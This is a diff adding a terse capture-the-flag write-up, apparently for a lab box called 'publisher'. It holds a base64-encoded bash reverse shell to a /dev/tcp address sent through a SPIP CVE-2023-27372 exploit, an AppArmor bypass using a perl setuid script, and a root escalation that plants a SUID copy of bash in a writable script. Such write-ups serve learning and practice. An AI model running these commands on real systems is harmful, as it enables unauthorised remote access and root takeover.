@@ -1,0 +1,101 @@
+SPIP exploit
+------------
+
+Run the reverse shell without uploading
+
+bash -i >& /dev/tcp/10.0.0.1/8080 0>&1 (YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS45OC4yMjUvMzMzMyAwPiYx)
+
+# python3 CVE-2023-27372.py -u http://10.10.106.249/spip/ -c "echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMS45OC4yMjUvMzMzMyAwPiYx | base64 -d | bash" -v 
+
+
+/usr/sbin/run_container (SUID)
+
+When run the /usr/sbin/run_container (/opt/run_container.sh is running), so that we can add reverse shell or /bin/bash > can get root access
+
+-rwxrwxrwx 1 root root 1715 Jan 10  2024 /opt/run_container.sh
+
+
+Eventhough we get full permission in other users, we can write but cannot save.
+SO, that exploit the apparmor.
+
+
+Apparmor provides an additional layer of security, particularly useful for restricting potentially 
+vulnerable applications such as web browsers, email clients, and server processes.
+
+
+think@publisher:/etc/apparmor.d$ cat usr.sbin.ash
+#include <tunables/global>
+
+/usr/sbin/ash flags=(complain) {
+  #include <abstractions/base>
+  #include <abstractions/bash>
+  #include <abstractions/consoles>
+  #include <abstractions/nameservice>
+  #include <abstractions/user-tmp>
+
+  # Remove specific file path rules
+  # Deny access to certain directories
+  deny /opt/ r,
+  deny /opt/** w,
+  deny /tmp/** w,
+  deny /dev/shm w,
+  deny /var/tmp w,
+  deny /home/** w,
+  /usr/bin/** mrix,
+  /usr/sbin/** mrix,
+
+  # Simplified rule for accessing /home directory
+  owner /home/** rix,
+}
+
+
+exploit apparmor with perl ( in Hacktricks)
+-------------------------------------------
+
+echo '#!/usr/bin/perl
+use POSIX qw(strftime);
+use POSIX qw(setuid);
+POSIX::setuid(0);
+exec "/bin/sh"' > /dev/shm/test.pl
+chmod +x /dev/shm/test.pl
+/dev/shm/test.pl
+
+
+Finally we can write and save in /opt/run_container.sh
+
+#!/bin/bash
+cp /usr/bin/bash /tmp/bash
+chmod +s /tmp/bash
+
+# Function to list Docker containers
+list_containers() {
+    if [ -z "$(docker ps -aq)" ]; then
+        docker run -d --restart always -p 8000:8000 -v /home/think:/home/think 4b5aec41d6ef;
+    fi
+
+
+run /usr/sbin/run_container
+
+#/usr/sbin/run_container
+
+think@publisher:/etc/apparmor.d$ /usr/sbin/run_container
+List of Docker containers:
+ID: 41c976e507f8 | Name: jovial_hertz | Status: Up 3 hours
+
+Enter the ID of the container or leave blank to create a new one: 
+/opt/run_container.sh: line 18: validate_container_id: command not found
+
+OPTIONS:
+1) Start Container
+2) Stop Container
+3) Restart Container
+4) Create Container
+5) Quit
+Choose an action for a container: 1
+Error response from daemon: page not found
+Error: failed to start containers: 
+
+
+But bash command is finally in /tmp directory
+
+#/tmp/bash -p
